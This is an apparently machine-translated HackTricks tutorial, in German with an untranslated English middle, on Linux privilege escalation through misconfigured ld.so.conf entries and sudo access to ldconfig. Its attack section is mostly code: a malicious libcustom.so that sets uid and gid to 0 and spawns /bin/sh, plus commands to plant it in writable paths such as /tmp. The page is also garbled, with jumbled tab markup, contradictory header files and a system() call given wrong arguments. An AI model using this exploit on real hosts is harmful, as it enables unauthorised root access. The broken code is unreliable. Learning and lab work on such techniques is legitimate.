# ld.so Privileg-Eskalations-Exploit-Beispiel

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Bereiten Sie die Umgebung vor

Im folgenden Abschnitt finden Sie den Code der Dateien, die wir verwenden werden, um die Umgebung vorzubereiten

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% tab title="libcustom.h" %}

```c
#ifndef LIBCUSTOM_H
#define LIBCUSTOM_H

void custom_function();

#endif
```

{% endtab %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% tabs %}
{% tab title="Befehl" %}
```bash
ldd sharedvuln
```
{% endtab %}

{% tab title="Ausgabe" %}
```bash
linux-vdso.so.1 (0x00007ffd3e1f2000)
libcustom.so => /usr/lib/libcustom.so (0x00007f8e8e3e1000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8e8e1f0000)
/lib64/ld-linux-x86-64.so.2 (0x00007f8e8e5e0000)
```
{% endtab %}
{% endtabs %}

### Modify the _ld.so.conf_ file

Edit the _/etc/ld.so.conf_ file and add the path to the directory where the malicious library is located. In this case, it is _/usr/lib_. 

```bash
sudo nano /etc/ld.so.conf
```

Add the following line at the end of the file:

```
/usr/lib
```

Save and exit the file.

### Update the dynamic linker cache

Run the following command to update the dynamic linker cache:

```bash
sudo ldconfig
```

### Check the environment again

Check that the _libcustom.so_ library is being **loaded** from the modified _ld.so.conf_ file and that you can **execute** the binary.

```bash
ldd sharedvuln
```

The output should show that _libcustom.so_ is being loaded from the modified _ld.so.conf_ file.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

In diesem Szenario nehmen wir an, dass **jemand einen anfälligen Eintrag** in einer Datei in _/etc/ld.so.conf/_ erstellt hat:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Der gefährdete Ordner ist _/home/ubuntu/lib_ (wo wir Schreibzugriff haben).\
**Laden Sie den folgenden Code herunter und kompilieren** Sie ihn in diesem Pfad:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Jetzt, da wir die bösartige libcustom-Bibliothek im fehlerhaft konfigurierten Pfad erstellt haben, müssen wir auf einen Neustart oder darauf warten, dass der Root-Benutzer `ldconfig` ausführt (falls Sie dieses Binär als sudo ausführen können oder es das SUID-Bit hat, können Sie es selbst ausführen).

Sobald dies geschehen ist, überprüfen Sie erneut, von wo aus die `sharevuln`-Ausführbare die `libcustom.so`-Bibliothek lädt:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Wie Sie sehen können, wird es **von `/home/ubuntu/lib` geladen** und wenn es von einem Benutzer ausgeführt wird, wird eine Shell ausgeführt:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Beachten Sie, dass wir in diesem Beispiel keine Privilegien eskaliert haben, sondern die ausgeführten Befehle modifiziert haben und **auf root oder einen anderen privilegierten Benutzer warten, um die verwundbare Binärdatei auszuführen**, um Privilegien zu eskalieren.
{% endhint %}

### Andere Fehlkonfigurationen - Gleiche Schwachstelle

Im vorherigen Beispiel haben wir eine Fehlkonfiguration vorgetäuscht, bei der ein Administrator einen nicht privilegierten Ordner in einer Konfigurationsdatei innerhalb von `/etc/ld.so.conf.d/` festgelegt hat.\
Es gibt jedoch andere Fehlkonfigurationen, die dieselbe Schwachstelle verursachen können. Wenn Sie **Schreibberechtigungen** in einer **Konfigurationsdatei** innerhalb von `/etc/ld.so.conf.d/`, im Ordner `/etc/ld.so.conf.d` oder in der Datei `/etc/ld.so.conf` haben, können Sie dieselbe Schwachstelle konfigurieren und ausnutzen.

## Exploit 2

**Angenommen, Sie haben sudo-Berechtigungen für `ldconfig`**.\
Sie können `ldconfig` angeben, **woher die Konfigurationsdateien geladen werden sollen**, sodass wir dies nutzen können, um `ldconfig` dazu zu bringen, beliebige Ordner zu laden.\
Erstellen wir also die benötigten Dateien und Ordner, um "/tmp" zu laden:
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Nun, wie im **vorherigen Exploit** angegeben, **erstellen Sie die bösartige Bibliothek innerhalb von `/tmp`**.\
Und schließlich laden wir den Pfad und überprüfen, von wo aus die Binärdatei die Bibliothek lädt:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Wie Sie sehen können, können Sie mit sudo-Berechtigungen über `ldconfig` dieselbe Schwachstelle ausnutzen.**

{% hint style="info" %}
Ich **habe keinen** zuverlässigen Weg gefunden, diese Schwachstelle auszunutzen, wenn `ldconfig` mit dem **suid-Bit** konfiguriert ist. Es erscheint der folgende Fehler: `/sbin/ldconfig.real: Kann temporäre Cache-Datei /etc/ld.so.cache~ nicht erstellen: Keine Berechtigung`
{% endhint %}

## Referenzen

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Dab-Maschine in HTB

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
